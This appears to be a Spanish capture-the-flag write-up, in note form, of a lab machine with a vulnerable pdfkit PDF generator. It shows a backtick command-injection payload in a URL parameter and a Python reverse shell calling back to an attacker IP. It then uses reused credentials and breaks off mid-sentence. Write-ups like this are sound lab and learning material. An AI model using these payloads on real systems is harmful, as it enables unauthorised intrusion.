# 

## Ping

- `ttl=63`
Entendemos que es linux

## Nmap
- `22/tcp ssh`
- `80/tcp http`

# Web
No nos arroja nada interesante a primera vista.
![[Pasted image 20230227112540.png]]

Pero parece ser que se nos permite Descargar una web en pdf. Por lo que probaremos a poner nuestra máquina atacante a 'escuchar' con:
`python3 -m http.server 80`


![[Pasted image 20230227112522.png]]

Nos arroja nuestra carpeta actual en PDF. Lo descargamos para analizar el archivo con `exiftool`
![[Pasted image 20230227112455.png]]

Vemos que está realizado con `pdfkit v0.8.6` . Realizamos una busqueda para ver si existe alguna vulnerabilidad:

Existe y nos dice lo siguiente:

PoC:
An application could be vulnerable if it tries to render a URL that contains query string parameters with user input:
```ruby
PDFKit.new("http://example.com/?name=#{params[:name]}").to_pdf
````

Probamos a meterle el parametro de `id` directamente en la barra de creación de pdf:

-``http://10.10.11.189/?name=%20`id`

![[Pasted image 20230227113235.png]]

Nos arroja su nombre, 'ruby'.

De esta manera, podemos ver que podremos injectar código, así que meteremos una rev shell, y escucharemos del otro lado 

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.XX.XX",9001));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("sh")'
```

Una vez enviada la rev shell, ejecutamos en ncat en el puerto que hemos indicado:
![[Pasted image 20230227140622.png]]

Vamos investigando por las carpetas y nos metemos en la carpeta `home` de ruby. Descubriendo el archivo config
![[Pasted image 20230227140848.png]]
A partir de aqui, no tenemos mucha idea, solo sabemos que henry tiene un user y que posblemente podamos acceder através de ssh para ir escalando. La contraseña en principio será la que nos ha arrojado el fichero config.
![[Pasted image 20230227141059.png]]
Una vez tengamos el control del usuario, usamos `sudo -l` para ver los privilegios del user `henry` 

![[Pasted image 20230227141316.png]]

![[Pasted image 20230227141908.png]]	
Sabemos que archivos pueden 

![[Pasted image 20230227142246.png]]